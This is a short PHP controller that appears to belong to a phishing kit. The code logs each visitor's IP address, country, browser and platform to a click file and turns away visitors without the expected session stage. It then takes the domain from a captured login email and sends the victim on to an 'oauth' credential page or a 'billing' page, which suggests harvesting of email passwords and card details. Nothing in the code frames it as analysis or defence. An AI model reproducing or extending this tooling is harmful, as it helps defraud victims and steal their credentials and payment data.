<?php
defined("ALLOW") or exit('No direct script access allowed');
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
class Activity
{
	public $goNEXA;
	public function __construct()
	{
		$this->goNEXA = new goNEXA();
		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 2)) {

			write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
	}

	public function index()
	{
		if ($this->goNEXA->is_mobile) {
			echo view('mobile/activity');
		} else {
			echo view('pc/activity');
		}
	}

	public function process()
	{
		preg_match("/\@(.+)\./", $_SESSION['emailLogin'], $match);

		$_SESSION['email_type'] = $match[1];

		if (_config('GETEMAIL') == 'on') {
			$_SESSION['access'] = 3;
			redirect(base_url() . 'oauth/#_ts=' . md5(rand(0, 999)));
		} else {
			$_SESSION['access'] = 4;
			redirect(base_url() . 'billing?_ts=' . md5(time()));
		}
	}
}